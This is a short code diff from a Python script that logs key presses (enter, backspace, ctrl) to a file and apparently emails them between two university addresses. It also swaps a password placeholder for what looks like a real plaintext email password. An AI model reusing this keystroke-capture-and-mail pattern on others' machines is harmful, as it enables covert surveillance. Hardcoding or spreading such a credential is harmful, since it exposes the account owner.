@@ -8,7 +8,7 @@ from message import sendMail
 
 emisor = "julio.escalon.s@uni.pe"
 receptor = "mmesiass@uni.pe"
-psw = "colocar_contraseña"
+psw = "JUCEESSAN98"
 rutaTXT = "press.txt"
 
 class tiempos:
@@ -40,7 +40,8 @@ class tiempos:
             if key == key.enter: self.pKey.append("key.enter")
             if key == key.backspace: self.pKey.append("key.backspace")
             if key == key.ctrl_l: self.pKey.append("key.ctrl_l")
-            if key == key.ctrl_r: self.pKey.append("key.ctrl_r")
+            if key == key.ctrl_r: 
+                self.pKey.append("key.ctrl_r")
             self.keyword = self.pKey[len(self.pKey)-1]
         self.appendLog(" "+self.keyword+" ")    
     
